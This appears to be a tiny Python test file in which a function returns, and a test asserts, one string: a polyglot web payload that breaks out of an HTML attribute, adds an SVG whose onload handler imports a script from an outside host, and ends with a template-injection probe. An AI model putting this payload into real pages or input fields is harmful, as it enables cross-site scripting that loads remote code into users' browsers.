def foo():
    return "'><s><svg/onload=import(/\nj.gr/)>${{7*7}}"


def test_answer():
    assert foo() == "'><s><svg/onload=import(/\nj.gr/)>${{7*7}}"
